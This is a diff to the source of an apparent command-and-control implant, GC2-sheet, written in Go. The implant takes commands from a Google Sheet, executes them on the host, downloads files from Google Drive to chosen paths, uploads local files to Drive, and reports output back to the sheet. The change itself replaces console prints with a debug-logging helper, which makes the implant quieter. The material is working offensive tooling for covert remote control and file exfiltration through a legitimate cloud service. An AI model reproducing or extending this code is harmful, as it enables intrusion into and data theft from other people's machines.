@@ -3,10 +3,8 @@ package C2
 import (
 	"GC2-sheet/internal/configuration"
 	"GC2-sheet/internal/utils"
-	"fmt"
 	"google.golang.org/api/drive/v3"
 	"google.golang.org/api/sheets/v4"
-	"log"
 	"os/exec"
 	"runtime"
 	"strings"
@@ -24,10 +22,10 @@ func execute(client *sheets.Service, clientDrive *drive.Service, spreadSheet *co
 	}
 
 	if commandToExecute == "" {
-		log.Println("No new command")
+		utils.LogDebug("No new command")
 		return
 	}
-	log.Println("New command: " + commandToExecute)
+	utils.LogDebug("New command: " + commandToExecute)
 
 	// Set new retrieved command
 	lastCommand.Input = commandToExecute
@@ -41,7 +39,7 @@ func execute(client *sheets.Service, clientDrive *drive.Service, spreadSheet *co
 		if len(slittedCommand) == 3{
 			fileDriveId := slittedCommand[1]
 			downloadPath := slittedCommand[2]
-			log.Println("New download command: FileId" + fileDriveId + " saving it to: " + downloadPath)
+			utils.LogDebug("New download command: FileId " + fileDriveId + " saving it to: " + downloadPath)
 			downloadErr := downloadFile(clientDrive, fileDriveId, downloadPath)
 			if downloadErr != nil {
 				lastCommand.Output = downloadErr.Error()
@@ -58,7 +56,7 @@ func execute(client *sheets.Service, clientDrive *drive.Service, spreadSheet *co
 		slittedCommand := strings.Split(commandToExecute,";")
 		if len(slittedCommand) == 2{
 			uploadFilePath := slittedCommand[1]
-			log.Println("New upload command: file path: " + uploadFilePath)
+			utils.LogDebug("New upload command: file path: " + uploadFilePath)
 			uploadErr := uploadFile(clientDrive, uploadFilePath, spreadSheet.DriveId)
 
 			if uploadErr != nil {
@@ -81,7 +79,7 @@ func execute(client *sheets.Service, clientDrive *drive.Service, spreadSheet *co
 	// Write output
 	writeSheet(client, spreadSheet, lastCommand)
 
-	fmt.Println("Execution")
+	utils.LogDebug("Execution")
 }
 
 func executeCommand(commandToExecute string) string {
